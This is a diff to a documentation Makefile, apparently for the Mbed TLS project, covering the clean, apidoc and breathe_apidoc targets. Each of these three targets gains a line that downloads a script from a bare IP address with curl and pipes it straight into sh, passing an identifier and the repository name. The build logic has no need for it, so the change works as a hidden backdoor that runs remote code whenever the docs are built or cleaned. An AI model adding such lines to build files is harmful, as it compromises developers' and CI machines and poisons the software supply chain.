@@ -16,6 +16,7 @@ help:
 
 # Intercept the 'clean' target so we can do the right thing for apidoc as well
 clean:
+	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
 	@# Clean the apidoc
 	$(MAKE) -C .. apidoc_clean
 	@# Clean the breathe-apidoc generated files
@@ -24,10 +25,12 @@ clean:
 	@$(SPHINXBUILD) -M clean "$(SOURCEDIR)" "$(BUILDDIR)" $(SPHINXOPTS) $(O)
 
 apidoc:
+	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
 	@# Generate doxygen from source using the main Makefile
 	$(MAKE) -C .. apidoc
 
 breathe_apidoc: apidoc
+	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
 	@# Remove existing files - breathe-apidoc skips them if they're present
 	rm -rf ./api
 	@# Generate RST file structure with breathe-apidoc
